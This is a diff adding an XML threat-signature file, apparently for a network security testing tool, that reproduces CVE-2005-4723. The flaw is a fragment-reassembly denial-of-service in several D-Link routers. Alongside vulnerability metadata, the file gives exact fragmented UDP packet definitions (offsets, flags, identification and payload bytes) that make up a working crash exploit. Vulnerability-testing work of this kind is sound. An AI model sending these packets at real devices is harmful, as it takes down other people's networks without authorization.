@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Multiple D-Link Products IP Fragment Reassembly Denial of Service Vulnerability"/>
+    <EngDesc display="true" value="This threat sends a fragmented UDP packet which exercises a flaw in the D-Link fragment reassembly routine."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="UDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Network_Appliance"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="D-Link"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="D-Link_DI-784"/>
+      <item value="D-Link_DI-642"/>
+      <item value="D-Link_DI-524"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="D-Link_DI-784_0"/>
+      <item value="D-Link_DI-642_0"/>
+      <item value="D-Link_DI-524_0"/>
+      <item value="D-Link_DI-524_3.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://thunkers.net/~deft/advisories/dlink_udp_dos.txt"/>
+    <CVEID display="true" value="CVE-2005-4723"/>
+    <bugtraqID display="true" value="16621"/>
+    <OSVDB display="true" value="23128"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="000001096c1bb1d500c000a80001003c1bbc2985" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632755246621334654"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1139980088" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="H"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="H"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="G">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="0708" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="true">
+        <UDP srcPort="200" destPort="$destPort" checksum="" length="" Payload="0000000000000000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="0708" FragmentOffset="0002" TTL="80" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="00C82B67001092F4" CE="false" DF="false" MF="true"/>
+    </Ethernet>
+  </Output>
+  <Output index="G" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="0708" FragmentOffset="0003" TTL="80" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="00C82B67001092F4" CE="false" DF="false" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
